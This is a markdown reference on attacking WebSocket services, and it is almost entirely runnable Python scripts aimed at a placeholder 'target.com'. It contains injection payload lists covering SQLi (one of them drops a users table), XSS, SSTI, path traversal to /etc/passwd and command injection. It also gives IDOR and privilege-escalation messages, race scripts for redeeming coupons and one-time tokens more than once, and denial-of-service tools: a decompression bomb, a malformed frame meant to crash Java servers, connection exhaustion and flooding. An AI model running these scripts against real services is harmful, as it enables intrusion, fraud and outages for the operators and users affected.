# In-Protocol Attacks — Deep Reference

## WebSocket Frame Structure (RFC 6455)

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
| Extended payload length continued, if payload len == 127      |
+ - - - - - - - - - - - - - - -+-------------------------------+
|     masking key (if MASK=1)                                   |
+---------------------------------------------------------------+
|                    Payload Data                               |
+---------------------------------------------------------------+
```

Opcodes: 0x0=continuation, 0x1=text, 0x2=binary, 0x8=close, 0x9=ping, 0xA=pong

---

## Message Injection — Payload Lists

### JSON Message Fuzzing Pattern
```python
import asyncio, websockets, json

PAYLOADS = [
    "1 OR 1=1--",                          # SQLi
    "' OR '1'='1",                         # SQLi single quote
    "1; DROP TABLE users--",               # SQLi destructive
    "<script>alert(1)</script>",           # XSS
    "<img src=x onerror=alert(1)>",        # XSS img
    "{{7*7}}",                             # SSTI Jinja2
    "${7*7}",                              # SSTI EL
    "#{7*7}",                              # SSTI Ruby/Pebble
    "<%= 7*7 %>",                          # SSTI ERB
    "../../../etc/passwd",                 # Path traversal
    "| id",                                # Command injection
    "; id;",                               # Command injection
    "$(id)",                               # Command injection
    "`id`",                                # Command injection
    "\\x00",                               # Null byte
    "A" * 65536,                           # Buffer overflow / size limit
    "\x00" * 1000,                         # Binary null spam
    json.dumps({"__proto__": {"admin": True}}),  # Prototype pollution
]

async def fuzz_ws(uri, template_msg, fuzz_field):
    async with websockets.connect(uri) as ws:
        for payload in PAYLOADS:
            msg = dict(template_msg)
            msg[fuzz_field] = payload
            await ws.send(json.dumps(msg))
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=3.0)
                print(f"[PAYLOAD] {payload[:50]!r} => {resp[:200]!r}")
            except asyncio.TimeoutError:
                print(f"[TIMEOUT] {payload[:50]!r}")

asyncio.run(fuzz_ws("wss://target.com/ws", {"action": "search", "q": ""}, "q"))
```

### Binary Frame Fuzzing
```python
import asyncio, websockets

async def fuzz_binary(uri):
    async with websockets.connect(uri) as ws:
        # Magic byte confusion
        payloads = [
            b"\xff\xd8\xff",            # Fake JPEG header
            b"\x89PNG\r\n\x1a\n",      # Fake PNG header
            b"PK\x03\x04",             # Fake ZIP header
            b"\x1f\x8b\x08",           # Fake GZIP header
            bytes(range(256)),          # All byte values
            b"\x00" * 10000,           # Large null payload
            b"\xff" * 10000,           # Large 0xFF payload
        ]
        for p in payloads:
            await ws.send(p)
            try:
                r = await asyncio.wait_for(ws.recv(), timeout=2.0)
                print(f"Binary fuzz {p[:8].hex()} => {r!r}")
            except Exception as e:
                print(f"Binary fuzz {p[:8].hex()} => {e}")

asyncio.run(fuzz_binary("wss://target.com/ws"))
```

---

## Authorization Bypass — Test Matrix

### IDOR via Message Parameters
After establishing a legitimate session, test:
```json
{"action": "get_messages", "user_id": "VICTIM_USER_ID"}
{"action": "get_profile", "account": "admin"}
{"action": "update_balance", "user_id": "OTHER_USER", "amount": 1000}
{"action": "subscribe", "channel": "admin_notifications"}
{"action": "delete_message", "message_id": "ANOTHER_USERS_MSG_ID"}
```

### Privilege Escalation via Message Fields
```json
{"action": "set_role", "role": "admin"}
{"action": "create_user", "role": "superadmin"}
{"type": "admin_command", "cmd": "list_users"}
```

### Post-Session-Expiry Testing
1. Establish authenticated WS connection
2. Invalidate the session server-side (logout from another tab)
3. Continue sending messages on the existing WS connection
4. If server still responds to privileged actions: session persistence bug

### Cross-Connection State Leak
If server broadcasts messages to "all users in room":
```python
# Connect as user A, listen
async with websockets.connect(uri, extra_headers={"Cookie": "session=A"}) as ws_a:
    # Simultaneously connect as user B and perform sensitive action
    # Check if user A receives user B's private data in broadcast
    ...
```

---

## Race Conditions

### Why WebSocket Race Conditions Are Unique
HTTP race conditions require synchronized parallel requests.
WebSocket race conditions can occur on a single connection (ordered message processing)
OR across multiple concurrent connections (shared state). Both vectors must be tested.

### Single-Connection Race (Message Order)
```python
import asyncio, websockets

async def race_single(uri, cookie):
    async with websockets.connect(uri, extra_headers={"Cookie": cookie}) as ws:
        # Send multiple competing messages without waiting for responses
        tasks = [
            ws.send('{"action":"redeem_coupon","code":"PROMO50"}'),
            ws.send('{"action":"redeem_coupon","code":"PROMO50"}'),
            ws.send('{"action":"redeem_coupon","code":"PROMO50"}'),
        ]
        await asyncio.gather(*tasks)
        # Collect all responses
        responses = []
        for _ in range(5):
            try:
                r = await asyncio.wait_for(ws.recv(), timeout=2.0)
                responses.append(r)
            except asyncio.TimeoutError:
                break
        print(responses)

asyncio.run(race_single("wss://target.com/ws", "session=YOURTOKEN"))
```

### Multi-Connection Race (Concurrent Connections)
```python
import asyncio, websockets

TARGET = "wss://target.com/ws"
COOKIE = "session=YOURTOKEN"
THREADS = 10

async def race_worker(worker_id, semaphore):
    async with websockets.connect(TARGET, extra_headers={"Cookie": COOKIE}) as ws:
        await ws.send('{"action":"use_token","token":"ONE_TIME_TOKEN"}')
        resp = await ws.recv()
        print(f"[Worker {worker_id}] {resp}")

async def race_multi():
    semaphore = asyncio.Semaphore(THREADS)
    await asyncio.gather(*[
        race_worker(i, semaphore) for i in range(THREADS)
    ])

asyncio.run(race_multi())
```

### Race Condition Targets
- One-time coupon / promo code redemption
- Limited inventory decrement
- Wallet credit / debit operations
- Account verification token consumption
- Rate limit bypasses (e.g., login attempts)
- Tournament/competition entry limits

---

## DoS Vectors

### Zlib Bomb (permessage-deflate Compression Oracle)

When `Sec-WebSocket-Extensions: permessage-deflate` is negotiated, the server must
decompress frames. A compressed payload that decompresses to gigabytes = OOM / CPU spike.

Detection: Check for `Sec-WebSocket-Extensions: permessage-deflate` in the 101 response.

```python
import asyncio, websockets, zlib, struct

async def zlib_bomb(uri):
    # Create a highly compressible payload
    bomb_data = b"A" * (10 * 1024 * 1024)  # 10MB of 'A's
    
    # Compress it (will be tiny)
    compressed = zlib.compress(bomb_data, level=9)
    
    # The websockets library with permessage-deflate will decompress server-side
    async with websockets.connect(
        uri,
        extensions=[websockets.extensions.permessage_deflate.ClientPerMessageDeflateFactory()]
    ) as ws:
        print(f"Sending {len(compressed)} compressed bytes → {len(bomb_data)} decompressed")
        await ws.send(bomb_data)  # Library compresses before send
        try:
            r = await asyncio.wait_for(ws.recv(), timeout=5.0)
            print(f"Response: {r!r}")
        except Exception as e:
            print(f"Server died: {e}")

asyncio.run(zlib_bomb("wss://target.com/ws"))
```

### Ping of Death (Malformed Frame — Java OOM)

Source: PortSwigger Research, Zakhar Fedotkin (2025).
Java WS implementations allocate buffer based on the `payload_length` field in the frame header.
Setting payload_length = 2147483647 (Integer.MAX_VALUE) with no actual payload → OOM crash.

```python
import socket, ssl

def ping_of_death(host, port, path="/ws"):
    # Build raw WebSocket frame with maxed-out payload length
    # Opcode 0x02 = binary frame, FIN=1, MASK=1 (client must mask)
    
    # Masking key (random 4 bytes)
    mask_key = b"\xDE\xAD\xBE\xEF"
    
    # Frame header:
    # Byte 0: FIN=1, RSV=0, opcode=0x2 (binary) → 0x82
    # Byte 1: MASK=1, payload_len=127 (means 8-byte extended length follows) → 0xFF
    # Bytes 2-9: 64-bit payload length = Integer.MAX_VALUE = 0x000000007FFFFFFF
    # Bytes 10-13: masking key
    # No payload bytes follow (we claim 2GB but send 0)
    
    header = bytes([
        0x82,  # FIN + binary opcode
        0xFF,  # MASK=1, payload_len=127 (8-byte extended)
    ])
    # 8-byte big-endian length = 2147483647
    length_bytes = (2147483647).to_bytes(8, byteorder='big')
    frame = header + length_bytes + mask_key
    # No payload bytes

    # First do the HTTP upgrade handshake
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.connect((host, port))
    
    if port == 443:
        ctx = ssl.create_default_context()
        conn = ctx.wrap_socket(raw, server_hostname=host)
    else:
        conn = raw

    upgrade_req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    ).encode()
    
    conn.send(upgrade_req)
    resp = conn.recv(4096)
    
    if b"101" not in resp:
        print(f"Upgrade failed: {resp!r}")
        return
    
    print("Upgrade OK. Sending Ping of Death frame...")
    conn.send(frame)
    
    try:
        data = conn.recv(4096)
        print(f"Server response: {data!r}")
    except Exception as e:
        print(f"Server crashed / disconnected: {e}")
    
    conn.close()

ping_of_death("target.com", 443, "/ws")
```

### Connection Exhaustion
```python
import asyncio, websockets

async def open_and_hold(uri, idx):
    try:
        async with websockets.connect(uri) as ws:
            print(f"[{idx}] Connected")
            # Send periodic pings to keep alive
            while True:
                await ws.send('{"ping": true}')
                await asyncio.sleep(10)
    except Exception as e:
        print(f"[{idx}] Dead: {e}")

async def exhaust(uri, count=1000):
    await asyncio.gather(*[open_and_hold(uri, i) for i in range(count)])

asyncio.run(exhaust("wss://target.com/ws"))
```

### Message Flooding
```python
import asyncio, websockets

async def flood(uri, cookie, rate_per_sec=1000):
    async with websockets.connect(uri, extra_headers={"Cookie": cookie}) as ws:
        interval = 1.0 / rate_per_sec
        i = 0
        while True:
            await ws.send(f'{{"msg": "flood-{i}"}}')
            i += 1
            await asyncio.sleep(interval)

asyncio.run(flood("wss://target.com/ws", "session=TOKEN"))
```

### Oversized Message Test
```python
import asyncio, websockets

async def oversize(uri):
    async with websockets.connect(uri) as ws:
        for size in [64*1024, 128*1024, 512*1024, 1*1024*1024, 10*1024*1024]:
            payload = "A" * size
            try:
                await ws.send(payload)
                r = await asyncio.wait_for(ws.recv(), timeout=5.0)
                print(f"[{size//1024}KB] Response: {r!r[:100]}")
            except Exception as e:
                print(f"[{size//1024}KB] Error: {e}")

asyncio.run(oversize("wss://target.com/ws"))
```

---

## Message Replay Attacks

### Capture and Replay
```python
import asyncio, websockets, json, time

class MessageReplayer:
    def __init__(self, uri, cookie):
        self.uri = uri
        self.cookie = cookie
        self.captured = []
    
    async def capture(self, duration=10):
        async with websockets.connect(
            self.uri, 
            extra_headers={"Cookie": self.cookie}
        ) as ws:
            start = time.time()
            while time.time() - start < duration:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=1.0)
                    self.captured.append({"ts": time.time(), "msg": msg})
                    print(f"Captured: {msg!r}")
                except asyncio.TimeoutError:
                    pass
    
    async def replay(self, mutations=None):
        async with websockets.connect(
            self.uri,
            extra_headers={"Cookie": self.cookie}
        ) as ws:
            for item in self.captured:
                msg = item["msg"]
                if mutations:
                    try:
                        data = json.loads(msg)
                        for key, val in mutations.items():
                            data[key] = val
                        msg = json.dumps(data)
                    except json.JSONDecodeError:
                        pass
                print(f"Replaying: {msg!r}")
                await ws.send(msg)
                try:
                    r = await asyncio.wait_for(ws.recv(), timeout=3.0)
                    print(f"Response: {r!r}")
                except asyncio.TimeoutError:
                    print("No response")
```
